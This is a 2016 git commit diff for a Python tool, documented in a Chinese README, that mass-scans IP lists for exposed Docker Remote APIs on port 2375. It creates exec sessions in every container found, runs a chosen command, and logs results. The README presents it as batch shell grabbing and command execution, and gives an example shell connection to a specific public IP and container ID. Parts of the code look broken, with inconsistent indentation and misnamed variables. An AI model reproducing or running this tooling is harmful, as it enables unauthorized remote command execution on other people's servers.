42242cd327d7d7f3d915212df7a4d27039bf9599
wantongtang <wantongtang@foxmail.com>
2016-05-20 16:23:00 +0800

    ok

--- README.md
+++ README.md
@@ -7,4 +7,64 @@
 	python run.py
 # reference
 	http://drops.wooyun.org/papers/15892
-	感谢：奇迹和他的朋友 
+	感谢：奇迹和他的朋友
+
+
+
+
+
+
+
+
+
+# 功能：批量抓取shell  ，批量执行命令，shell连接
+
+# 批量验证和执行命令：
+	python run.py
+    
+	验证结果保存在 result.txt 
+	批零执行命令结果保存在： result_cmd.txt
+# shell 连接：
+	python shell.py ip cid
+
+	python shell.py  115.159.45.79 105db2dd6cb68d6feb37038e5eabe52ae32b94e5873613741a36eb5998433509
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
--- run.py
+++ run.py
@@ -1,8 +1,9 @@
 #!/usr/bin/env python
+# coding:utf-8
 import json
 import requests
 import sys
-cmd = 'ls'
+mycmd = 'ifconfig' # 批量执行的命令
 
 def requestCid(ip,ids,cmd):
 #    proxies = {"http": "http://127.0.0.1:8090"}
@@ -19,10 +20,6 @@ def requestCid(ip,ids,cmd):
     resp=requests.post('http://%s:2375/containers/%s/exec'%(ip,ids), data=payload,headers=headers,timeout=2)
     #resp=requests.post('http://%s:2375/containers/%s/exec'%(ip,ids), data=payload,headers=headers,proxies=proxies)
     
-    output=open('result.txt','a')
-    output.write("\n %s  :  %s"%(ip,json.loads(resp.text)['Id']))
-    output.close()
-    print json.loads(resp.txt)['Id']
     return json.loads(resp.text)['Id']
 
 
@@ -33,26 +30,35 @@ def CommandExec(ip,cid):
     return resp.text
 
 def listDockerId(ip):
-    print "IP:%s"%ip
+#    print "IP:%s"%ip
     data=resp=requests.get('http://%s:2375/containers/json'%ip,timeout=2)
     jsond=json.loads(data.text)
     for i in xrange(1,len(jsond)):
-        print jsond[i-1]['Id']
-	output=open('result.txt','a')
-	output.write("\n %s  :  %s"%(line.replace('\n',''),jsond[i-1]['Id']))
+#        print jsond[i-1]['Id']
+	output=open('result1.txt','a')
+	output.write("\n %s    %s"%(line.replace('\n',''),jsond[i-1]['Id']))
 	output.close()
-#	requestCid(ip,jsond[i-1]['Id'],cmd)
+	result = CommandExec(ip,requestCid(ip,jsond[i-1]['Id'],mycmd))
+	if not( '172' in result.split('.')[0]  or '192' in result.split('.')[0] or '10' in result.split('.')[0]):
+		print ("ip:%s  OS: %s"%(ip,result))		
+    	output=open('result_cmd1.txt','a')
+        output.write("\n %s   %s"%(ip,result))
+        output.close()
 	
+if __name__== '__main__':
+	if len(sys.argv)==2:
+		try :
+			file_obj=open(sys.argv[1])
+		except:
+			print 'file %s do not exist'%(sys.argv)
+		if file_obj:
+			for line in file_obj:
+				try:
+					ip = line.replace('\n','')
+				        listDockerId(ip)
+				except:
+					print 'timeout'
+		file_obj.close()
 
 
-file_obj=open('ip.txt')
 
-for line in file_obj:
-	try:
-		ip = line.replace('\n','')
-	        listDockerId(ip)
-	except:
-		print 'timeout'
-
-
-file_obj.close()
